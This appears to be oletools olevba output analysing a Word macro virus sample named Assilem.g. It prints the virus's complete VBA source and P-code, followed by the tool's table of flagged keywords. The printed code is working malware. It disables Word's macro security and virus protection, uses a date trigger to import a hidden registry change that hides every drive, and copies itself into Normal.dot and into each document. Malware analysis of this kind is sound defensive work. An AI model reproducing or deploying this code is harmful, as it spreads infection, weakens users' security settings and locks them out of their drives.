olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Assilem.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NoDrives.cls 
in file: Virus.MSWord.Assilem.g - OLE stream: 'Macros/VBA/NoDrives'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Seguridad...").Enabled = False
    CommandBars("Macro").Controls("Macros...").Enabled = False
    CommandBars("Macro").Controls("Editor de visual basic").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
    If Day(Now()) >= 1 And Month(Now()) = 1 And Year(Now()) = 2000 Then
        If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDrives") = "" Then
            Open "c:\NoD.reg" For Output As #1
                Print #1, "REGEDIT4"
                Print #1, ""
                Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]"
                Print #1, Chr(34) & "NoDrives" & Chr(34) & "=dword:03ffffff"
            Close #1
           Shell "Regedit.exe c:\NoD.reg", vbHide
           SendKeys "~", True
           DoEvents
           Pause = Timer + 3
           Do While Timer < Pause
           Loop
           SendKeys "~", True
           Kill "c:\NoD.reg"
        End If
    End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "NoDrives" Then
If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
    Set ToInfect = ADI1
    ADI1.Name = "NoDrives"
    DoAD = True
End If
If NTI1.Name <> "NoDrives" Then
If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
    Set ToInfect = NTI1
    NTI1.Name = "NoDrives"
    DoNT = True
End If
If DoNT = True Then
    Do While ADI1.CodeModule.Lines(1, 1) = ""
       ADI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
    Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
        ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
        BGN = BGN + 1
    Loop
End If
If DoAD = True Then
    Do While NTI1.CodeModule.Lines(1, 1) = ""
        NTI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
    Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
        ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
        BGN = BGN + 1
    Loop
End If
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Assilem.g
' ===============================================================================
' Module streams:
' Macros/VBA/NoDrives - 5110 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Seguridad..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Macros..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x0016 "Editor de visual basic"
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ge 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #12:
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0008 "NoDrives"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x000A "c:\NoD.reg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0008 "NoDrives"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000F "=dword:03ffffff"
' 	Concat 
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #19:
' 	LitStr 0x0016 "Regedit.exe c:\NoD.reg"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #20:
' 	LitStr 0x0001 "~"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #21:
' 	ArgsCall DoEvents 0x0000 
' Line #22:
' 	Ld Timer 
' 	LitDI2 0x0003 
' 	Add 
' 	St Pause 
' Line #23:
' 	Ld Timer 
' 	Ld Pause 
' 	Lt 
' 	DoWhile 
' Line #24:
' 	Loop 
' Line #25:
' 	LitStr 0x0001 "~"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #26:
' 	LitStr 0x000A "c:\NoD.reg"
' 	ArgsCall Kill 0x0001 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #31:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #32:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #33:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #34:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0008 "NoDrives"
' 	Ne 
' 	IfBlock 
' Line #35:
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #36:
' 	SetStmt 
' 	Ld ADI1 
' 	Set ToInfect 
' Line #37:
' 	LitStr 0x0008 "NoDrives"
' 	Ld ADI1 
' 	MemSt New 
' Line #38:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0008 "NoDrives"
' 	Ne 
' 	IfBlock 
' Line #41:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #42:
' 	SetStmt 
' 	Ld NTI1 
' 	Set ToInfect 
' Line #43:
' 	LitStr 0x0008 "NoDrives"
' 	Ld NTI1 
' 	MemSt New 
' Line #44:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #49:
' 	Loop 
' Line #50:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #51:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #52:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #54:
' 	Loop 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #59:
' 	Loop 
' Line #60:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #61:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #62:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #63:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #64:
' 	Loop 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #69:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |NoD.reg             |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

